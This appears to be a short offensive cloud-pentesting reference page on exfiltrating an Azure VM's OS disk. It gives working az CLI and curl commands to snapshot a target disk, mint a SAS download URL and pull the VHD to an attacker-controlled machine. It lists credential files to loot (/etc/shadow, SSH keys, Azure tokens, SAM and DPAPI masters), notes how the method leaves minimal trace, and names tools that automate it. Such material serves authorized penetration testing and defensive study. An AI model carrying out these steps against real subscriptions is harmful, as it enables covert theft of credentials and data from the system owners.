---
title: "Disk snapshots: exporting a managed disk to read it offline"
order: 3
description: "Creating and exporting Azure managed-disk snapshots to read a VM's OS disk offline."
keywords:
  - disk snapshot
  - managed disk
  - OS disk
  - export
  - offline read
---

# Disk snapshots

A managed disk holds a VM's OS and data volumes, including its secrets, SSH keys, and stored credentials. With rights over the compute or disk resources (`Microsoft.Compute/disks/*`, `Microsoft.Compute/snapshots/*`), you snapshot a target's disk and export the snapshot to a downloadable VHD, reading the whole filesystem offline without ever touching the running VM.

## Snapshot and export

```bash
# snapshot the target's OS disk
az snapshot create -g rg -n loot-snap --source <os-disk-id>

# mint a time-limited download URL (SAS) for the snapshot VHD
az snapshot grant-access -g rg -n loot-snap --duration-in-seconds 3600 \
  --query accessSas -o tsv

# download the VHD, then mount it read-only on a box you control
curl -o disk.vhd "<accessSas>"
```

## Exploitation notes

- `grant-access` returns a SAS to the raw VHD, so you never attach the disk in the target subscription and leave minimal compute-side trace; the snapshot and the access grant are the only events.
- Mount the VHD read-only and pull `/etc/shadow`, `/root/.ssh`, `/home/*/.azure`, and application config; on Windows disks, the SAM, SYSTEM hive, and DPAPI masters.
- A snapshot can be copied to a storage account or another subscription you control for unhurried analysis.
- MicroBurst's `Get-AzPasswordsREST` and disk tooling automate the snapshot-and-pull flow.

## Tools

- **az CLI** (`snapshot create`, `snapshot grant-access`): the export.
- **MicroBurst** (`Get-AzureDiskExport` style modules): automated disk export and offline parsing.
- **libguestfs / guestmount**: mount the VHD read-only for looting.

## References

- [HackTricks Cloud: Azure VMs and disks](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-virtual-machines.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: export a managed disk snapshot](https://learn.microsoft.com/azure/virtual-machines/scripts/create-vm-from-snapshot)
